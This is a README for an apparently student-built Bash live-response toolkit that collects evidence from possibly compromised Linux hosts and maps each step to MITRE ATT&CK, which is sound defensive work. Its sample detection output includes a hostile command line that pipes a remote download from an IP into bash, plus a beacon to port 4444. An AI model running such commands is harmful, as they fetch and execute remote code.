# linux-triage-toolkit

**Modular Bash-based live-response collector for Linux hosts during incident response.**

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
[![Shell: Bash](https://img.shields.io/badge/shell-Bash%204.4%2B-1f425f.svg)](https://www.gnu.org/software/bash/)
[![Platform: Linux](https://img.shields.io/badge/platform-Linux-blue.svg)](https://github.com/WiLL75G/linux-triage-toolkit)
[![Modules Shipped](https://img.shields.io/badge/modules-3%20%2F%208-brightgreen.svg)](https://github.com/WiLL75G/linux-triage-toolkit/tree/main/modules)
[![MITRE ATT&CK](https://img.shields.io/badge/MITRE-ATT%26CK%20mapped-red.svg)](https://attack.mitre.org/)
[![Status](https://img.shields.io/badge/status-active%20development-orange.svg)](https://github.com/WiLL75G/linux-triage-toolkit/commits/main)

---

## ⚡ TL;DR

`linux-triage-toolkit` snapshots the volatile state of a potentially compromised Linux host logged-in users, running processes, network connections, persistence mechanisms, file artifacts, and logs into a portable, hash-signed evidence bundle **in under 10 seconds**, using only Bash and standard POSIX tools. Every collection step is mapped to a **MITRE ATT&CK** technique so analysts know exactly what each artifact is worth.

Built as a public, incrementally-shipped learning project by a **SOC analyst-in-training** to demonstrate incident-response thinking, defensive Bash engineering, and Linux internals knowledge.

---

## Table of Contents

- [The Problem](#-the-problem)
- [What This Tool Does](#-what-this-tool-does)
- [Why This Project Exists](#-why-this-project-exists)
- [How It Works](#%EF%B8%8F-how-it-works)
- [Live Demo](#-live-demo-sample-output)
- [Installation](#-installation)
- [Usage](#%EF%B8%8F-usage)
- [Module Catalog](#-module-catalog)
- [MITRE ATT&CK Coverage](#-mitre-attck-coverage)
- [Design Decisions](#-design-decisions)
- [Skills Demonstrated](#-skills-demonstrated)
- [Roadmap & Progress](#-roadmap--progress)
- [Repository Structure](#-repository-structure)
- [Limitations & Future Work](#%EF%B8%8F-limitations--future-work)
- [Author & Contact](#-author--contact)
- [License](#-license)

---

## The Problem

When a Linux host is suspected of compromise, an incident responder has minutes sometimes seconds to capture evidence before it evaporates:

- **Running processes** disappear the moment an attacker kills their shell
- **Network connections** vanish on reboot
- **In-memory malware** leaves no filesystem trace
- **Attackers actively delete evidence** during clean-up

Commercial DFIR tools like Velociraptor, UAC, and Linux IR Triage exist but they carry deployment overhead, require configuration, and don't teach the responder *what to collect or why*. In many real engagements, a fast, self-contained shell script is what actually gets used.

---

## What This Tool Does

`linux-triage-toolkit` provides a **single-command triage collection** that captures the volatile and semi-volatile evidence a SOC analyst needs to make a rapid containment decision:

- ✅ **System identity** hostname, kernel, OS, timezone
- ✅ **Users & sessions** who's on the host now, login history, UID-0 anomalies, sudoers
- ✅ **Running processes** full process tree, deleted-binary detection (fileless malware indicator)
- 🔜 Network state, persistence mechanisms, file artifacts, log excerpts, and binary hashes (in progress)

Every artifact is:

- **Timestamped in UTC** for cross-timezone correlation
- **Written to a per-host, per-run case directory** for auditability
- **Bundled into a `.tar.gz` and SHA-256 hashed** chain of custody preserved

---

## Why This Project Exists

This project is a **deliberate, public learning artifact** built to demonstrate three things a hiring manager needs to see from an entry-level SOC analyst:

1. **Incident-response thinking** understanding volatility order, evidence priority, and containment vs. investigation trade-offs
2. **Defensive Bash engineering** production-grade shell scripting with fault tolerance, chain-of-custody, and graceful degradation
3. **Linux internals fluency** using `/proc`, `/etc/passwd` UID analysis, and process introspection the way real DFIR tools do

The 7-Sunday incremental build cadence (with public commits and posts each week) also demonstrates **consistent, disciplined delivery** the same discipline required in a real SOC rotation.

---

## How It Works

Three steps, one command:

1. **[`triage.sh`](https://github.com/WiLL75G/linux-triage-toolkit/blob/main/triage.sh)** creates a timestamped case directory for this run.
2. Each script in **[`modules/`](https://github.com/WiLL75G/linux-triage-toolkit/tree/main/modules)** runs in order and writes its findings into that directory.
3. The whole directory is bundled into a **`.tar.gz`** and a **SHA-256 hash** is generated for chain of custody.

That's it. No agents, no dependencies, no configuration files.

---

## Live Demo (Sample Output)

**Detecting evasive malware via deleted binaries** a signature technique of this toolkit:

```
--- Processes with deleted binaries (T1055 evasion indicator) ---
PID 4471 -> /tmp/x (deleted)
  cmdline: /tmp/x --beacon 45.33.32.156:4444
PID 4519 -> /home/svc-web/.cache/.x (deleted)
  cmdline: sh -c curl -s http://185.220.101.34/p | bash
```

**What this tells the analyst:** two processes are running from binaries that were deleted from disk after execution. This is a classic anti-forensics technique the malware exists only in memory. Filesystem AV would miss both. **The kernel's `/proc/<pid>/exe` symlink still holds the truth**, and this module surfaces it.

**Real host baseline (macOS dev environment, expected clean output):**

```
--- Processes with deleted binaries (T1055 evasion indicator) ---
/proc not available (not Linux expected on macOS)
```

The module recognizes non-Linux hosts and degrades gracefully instead of crashing **production-quality defensive coding**.

**Chain-of-custody verification:**

```
$ sha256sum -c output/ir-host_20260702T112120Z.tar.gz.sha256
output/ir-host_20260702T112120Z.tar.gz: OK
```

---

## Installation

### Requirements

- Linux host (Ubuntu 18.04+, Debian 10+, CentOS 7+, RHEL 7+)
- Bash 4.4+, standard GNU coreutils (`tar`, `sha256sum`, `find`, `awk`)
- **Root or sudo strongly recommended** — some artifacts (auth logs, `lastb`, sudoers) require elevated privileges

### Clone & prep

```bash
git clone https://github.com/WiLL75G/linux-triage-toolkit.git
cd linux-triage-toolkit
chmod +x triage.sh modules/*.sh
```

That's it. No dependencies, no configuration, no compilation.

---

## Usage

### One-shot collection

```bash
sudo ./triage.sh
```

Artifacts are written to `output/<hostname>_<UTC-timestamp>/`, then bundled to `.tar.gz` with an accompanying `.sha256` hash.

### Verify bundle integrity later

```bash
sha256sum -c output/<hostname>_<UTC-timestamp>.tar.gz.sha256
```

### Extract for offline analysis

```bash
tar -xzf output/<hostname>_<UTC-timestamp>.tar.gz
```

---

## Module Catalog

| # | Module | Purpose | MITRE ATT&CK | Status |
|---|---|---|---|---|
| 01 | [`01_system_info.sh`](https://github.com/WiLL75G/linux-triage-toolkit/blob/main/modules/01_system_info.sh) | Host identity, OS, kernel, timezone | [T1082](https://attack.mitre.org/techniques/T1082/) | ✅ Shipped |
| 02 | [`02_users.sh`](https://github.com/WiLL75G/linux-triage-toolkit/blob/main/modules/02_users.sh) | Logged-in users, login history, UID-0 audit, sudoers | [T1087](https://attack.mitre.org/techniques/T1087/), [T1078](https://attack.mitre.org/techniques/T1078/) | ✅ Shipped |
| 03 | [`03_processes.sh`](https://github.com/WiLL75G/linux-triage-toolkit/blob/main/modules/03_processes.sh) | Process tree, **deleted-binary detection**, CPU/mem top-10 | [T1057](https://attack.mitre.org/techniques/T1057/), [T1055](https://attack.mitre.org/techniques/T1055/) | ✅ Shipped |
| 04 | `04_network.sh` | Listeners, established conns, ARP, firewall rules | [T1049](https://attack.mitre.org/techniques/T1049/), [T1016](https://attack.mitre.org/techniques/T1016/) | 🔜 Planned |
| 05 | `05_persistence.sh` | Cron, systemd, rc.local, SSH keys, shell rc files | [T1543](https://attack.mitre.org/techniques/T1543/), [T1053](https://attack.mitre.org/techniques/T1053/), [T1098](https://attack.mitre.org/techniques/T1098/) | 🔜 Planned |
| 06 | `06_files.sh` | Recent modifications, SUID/SGID, world-writable | [T1083](https://attack.mitre.org/techniques/T1083/), [T1222](https://attack.mitre.org/techniques/T1222/) | 🔜 Planned |
| 07 | `07_logs.sh` | auth.log, syslog, journalctl, bash history | [T1070](https://attack.mitre.org/techniques/T1070/) | 🔜 Planned |
| 08 | `08_hashes.sh` | SHA-256 of suspect binaries for IOC sharing | — | 🔜 Planned |

---

## MITRE ATT&CK Coverage

Every module maps to specific ATT&CK techniques so downstream analysts can immediately understand what each artifact demonstrates.

| Tactic | Technique | Name | Module |
|---|---|---|---|
| Discovery | [T1082](https://attack.mitre.org/techniques/T1082/) | System Information Discovery | 01 |
| Discovery | [T1087](https://attack.mitre.org/techniques/T1087/) | Account Discovery | 02 |
| Discovery | [T1057](https://attack.mitre.org/techniques/T1057/) | Process Discovery | 03 |
| Discovery | [T1049](https://attack.mitre.org/techniques/T1049/) | System Network Connections Discovery | 04 |
| Discovery | [T1016](https://attack.mitre.org/techniques/T1016/) | System Network Configuration Discovery | 04 |
| Discovery | [T1083](https://attack.mitre.org/techniques/T1083/) | File and Directory Discovery | 06 |
| Initial Access | [T1078](https://attack.mitre.org/techniques/T1078/) | Valid Accounts | 02 |
| Defense Evasion | [T1055](https://attack.mitre.org/techniques/T1055/) | Process Injection (deleted-binary indicator) | 03 |
| Defense Evasion | [T1070](https://attack.mitre.org/techniques/T1070/) | Indicator Removal on Host | 07 |
| Defense Evasion | [T1222](https://attack.mitre.org/techniques/T1222/) | File and Directory Permissions Modification | 06 |
| Persistence | [T1543](https://attack.mitre.org/techniques/T1543/) | Create or Modify System Process | 05 |
| Persistence | [T1053](https://attack.mitre.org/techniques/T1053/) | Scheduled Task / Job | 05 |
| Persistence | [T1098](https://attack.mitre.org/techniques/T1098/) | Account Manipulation | 05 |

**8 techniques covered today, 13 at completion.**

---

## Design Decisions

These are the deliberate engineering choices that separate this toolkit from a hobby script.

### `set -euo pipefail` on every script

Fail fast, fail loud. Silent failure during an incident is dangerous an analyst thinking "the collection succeeded" when in fact half the artifacts are missing is worse than a script that crashes visibly.

### UTC everywhere

`date -u +%Y-%m-%dT%H:%M:%SZ` for every timestamp. IR analysts across regions must correlate events; local time zones are noise. The `Z` suffix declares Zulu/UTC explicitly.

### Per-module fault isolation

The orchestrator's `if bash "${module}" "${CASE_DIR}"; then ... else "FAILED (continuing)" fi` pattern ensures one broken module never aborts the collection. In IR, partial data beats no data.

### Chain of custody via SHA-256

Every bundle is hashed the moment it's written. Any subsequent modification of the tarball breaks the hash an implicit tamper-evident seal an auditor can verify.

### Deleted-binary detection via `/proc/<pid>/exe`

When attackers delete their binary after execution, the kernel keeps the process's `exe` symlink but appends `(deleted)`. This module walks `/proc/[0-9]*` and surfaces every hit a technique used by real DFIR tools and one that catches malware filesystem AV misses entirely.

### Portable Bash idioms

- `command -v foo` (POSIX) instead of `which foo` (inconsistent across systems)
- Parameter expansion with defaults: `${1:?case directory required}`
- Grouped output redirection: `{ ... } > "${OUT}"` (one open, one close)
- NUL-to-space translation: `tr '\0' ' ' < /proc/<pid>/cmdline` for readable arguments

---

## Skills Demonstrated

*(For recruiters and hiring managers what this repository proves I can do.)*

- **Incident-response methodology** volatility-first collection order, chain-of-custody discipline, decision-focused artifact prioritization
- **MITRE ATT&CK fluency** every collection step explicitly mapped to a technique; both offensive ([T1055](https://attack.mitre.org/techniques/T1055/) evasion) and defensive ([T1082](https://attack.mitre.org/techniques/T1082/) discovery) angles
- **Defensive Bash engineering** production-grade error handling, portable idioms, feature detection, graceful degradation
- **Linux internals knowledge** `/proc` traversal, symlink introspection, UID auditing, NUL-separated cmdline parsing
- **Detection engineering mindset** thinking about what artifacts *reveal* an attacker, not just what commands *exist*
- **Documentation and communication** this README is itself a work sample; ability to translate technical work into a hiring manager's decision language
- **Version-controlled, disciplined shipping** public [Git history](https://github.com/WiLL75G/linux-triage-toolkit/commits/main) showing weekly incremental commits, meaningful messages, and no force-pushes

---

## Roadmap & Progress

**Public 7-Sunday build series** one module per Sunday, with a matching LinkedIn/X writeup each week.

| # | Sunday | Scope | Status |
|---|---|---|---|
| 1 | May 24, 2026 | Project scaffold + `triage.sh` orchestrator + [`01_system_info`](https://github.com/WiLL75G/linux-triage-toolkit/blob/main/modules/01_system_info.sh) | ✅ Shipped |
| 2 | May 31, 2026 | [`02_users`](https://github.com/WiLL75G/linux-triage-toolkit/blob/main/modules/02_users.sh) sessions, login history, sudoers audit | ✅ Shipped |
| 3 | Jul 2, 2026 | [`03_processes`](https://github.com/WiLL75G/linux-triage-toolkit/blob/main/modules/03_processes.sh) process tree + deleted-binary detection *(catch-up)* | ✅ Shipped |
| 4 | Jul 5, 2026 | `04_network` listeners, established conns, ARP, firewall | 🔜 Planned |
| 5 | Jul 12, 2026 | `05_persistence` cron, systemd, SSH keys, shell rc files | 🔜 Planned |
| 6 | Jul 19, 2026 | `06_files` + `07_logs` file artifacts and log capture | 🔜 Planned |
| 7 | Jul 26, 2026 | `08_hashes` + Ubuntu VM validation + final SOC incident report | 🔜 Planned |

> Cadence transparency: Week 3 was pushed from Jun 7 to Jul 2 due to schedule slip. Remaining weeks re-baselined accordingly. Real-world project discipline includes real-world replanning.

---

## Repository Structure

```
linux-triage-toolkit/
├── triage.sh                     # Main orchestrator
├── modules/                      # Drop-in collection scripts
│   ├── 01_system_info.sh
│   ├── 02_users.sh
│   └── 03_processes.sh
├── output/                       # Generated bundles (gitignored)
│   └── .gitkeep
├── .gitignore
├── LICENSE
└── README.md
```

Browse the code: [triage.sh](https://github.com/WiLL75G/linux-triage-toolkit/blob/main/triage.sh) · [modules/](https://github.com/WiLL75G/linux-triage-toolkit/tree/main/modules) · [.gitignore](https://github.com/WiLL75G/linux-triage-toolkit/blob/main/.gitignore) · [LICENSE](https://github.com/WiLL75G/linux-triage-toolkit/blob/main/LICENSE)

---

## Limitations & Future Work

**Current limitations:**

- Primarily tested against **Debian/Ubuntu**; RHEL/CentOS code paths use fallbacks that are not yet end-to-end validated
- Some artifacts (`auth.log`, `lastb`, `sudoers`) require root; the tool degrades gracefully with explicit "not readable" notices rather than crashing
- **No remote collection** designed for on-host execution; use `scp` to retrieve bundles from a compromised host
- **Assumes uncompromised root at collection time** a pre-existing rootkit could return falsified data. Layer with LiME-based memory acquisition for a complete answer.

**Planned enhancements:**

- JSON output mode for SIEM ingestion (Splunk, Sentinel)
- Optional remote artifact upload (SFTP / S3 target)
- Memory acquisition module (LiME integration)
- Detection signature library curated known-bad cron entries, suspicious `.bashrc` snippets, common webshell paths
- Ubuntu VM automated validation harness (attacker plants IOCs → toolkit runs → validation diffs)

---

## Author & Contact

**[@WilliamInCyber](https://x.com/WilliamInCyber)** SOC Analyst (in training)
Focused on blue-team operations, threat detection, and incident response.

- **GitHub:** [@WiLL75G](https://github.com/WiLL75G)
- **X / Twitter:** [@WilliamInCyber](https://x.com/WilliamInCyber)
- **Portfolio:** [will75g.github.io/-portfolio/](https://will75g.github.io/-portfolio/)

*Currently seeking Tier 1 / entry-level SOC roles at remote-friendly MSSPs. Open to conversations reach out via LinkedIn or [GitHub Issues](https://github.com/WiLL75G/linux-triage-toolkit/issues) on this repository.*

---

## License

MIT License see [LICENSE](https://github.com/WiLL75G/linux-triage-toolkit/blob/main/LICENSE) for full text.

---

**Built in public as part of a documented learning journey toward a SOC Tier 1 Analyst role.**
Feedback, issues, and [pull requests](https://github.com/WiLL75G/linux-triage-toolkit/pulls) welcomed.
